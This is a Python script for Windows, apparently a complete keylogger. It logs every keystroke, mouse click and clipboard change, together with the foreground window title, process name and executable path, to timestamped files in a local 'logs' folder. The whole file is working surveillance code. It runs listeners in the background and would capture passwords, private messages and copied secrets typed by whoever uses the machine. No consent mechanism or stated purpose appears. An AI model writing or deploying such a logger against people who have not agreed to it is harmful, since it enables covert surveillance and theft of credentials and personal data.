import os
from datetime import datetime
from pynput import keyboard, mouse
import platform
import win32gui  # For active window
import win32process  # For process details
import psutil  # To fetch process details
import pyperclip  # Clipboard monitoring
import threading  # Separate thread for clipboard monitoring
import time  # For periodic clipboard checks

# Create log directory
log_dir = "logs"
os.makedirs(log_dir, exist_ok=True)

# Define log file with session-specific naming
log_file = os.path.join(log_dir, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

# Utility function: Write logs
def write_log(data):
    try:
        with open(log_file, "a", encoding="utf-8") as file:
            file.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {data}\n")
    except Exception as e:
        print(f"Error writing log: {e}")

# Utility function: Get active application with process info
def get_active_window_with_context():
    try:
        window = win32gui.GetForegroundWindow()
        pid = win32process.GetWindowThreadProcessId(window)[1]
        process = psutil.Process(pid)
        app_name = win32gui.GetWindowText(window)
        process_name = process.name()
        process_path = process.exe()
        return f"{app_name} | Process: {process_name} | Path: {process_path}"
    except Exception as e:
        return f"Error retrieving application context: {e}"

# Clipboard Monitoring
def monitor_clipboard():
    last_clipboard_content = ""
    while True:
        try:
            clipboard_content = pyperclip.paste()
            if clipboard_content != last_clipboard_content:  # Check if clipboard content has changed
                app_context = get_active_window_with_context()
                write_log(f"Clipboard Copied: '{clipboard_content}' in {app_context}")
                last_clipboard_content = clipboard_content
        except Exception as e:
            write_log(f"Error monitoring clipboard: {e}")
        time.sleep(1)  # Check clipboard every second

# Keyboard Listener: Log keystrokes
def on_key_press(key):
    try:
        app_context = get_active_window_with_context()
        if hasattr(key, 'char') and key.char is not None:
            write_log(f"Key Pressed: '{key.char}' in {app_context}")
        else:
            write_log(f"Special Key Pressed: {key} in {app_context}")
    except Exception as e:
        write_log(f"Error capturing key: {e}")

# Mouse Listener: Log mouse clicks
def on_click(x, y, button, pressed):
    try:
        app_context = get_active_window_with_context()
        action = "Pressed" if pressed else "Released"
        write_log(f"Mouse {action}: {button} at ({x}, {y}) in {app_context}")
    except Exception as e:
        write_log(f"Error capturing mouse event: {e}")

# Start clipboard monitoring in a separate thread
clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
clipboard_thread.start()

# Start listeners for both keyboard and mouse
keyboard_listener = keyboard.Listener(on_press=on_key_press)
mouse_listener = mouse.Listener(on_click=on_click)

keyboard_listener.start()
mouse_listener.start()

# Wait for both listeners to complete (end with CTRL+C or ESC key manually)
keyboard_listener.join()
mouse_listener.join()
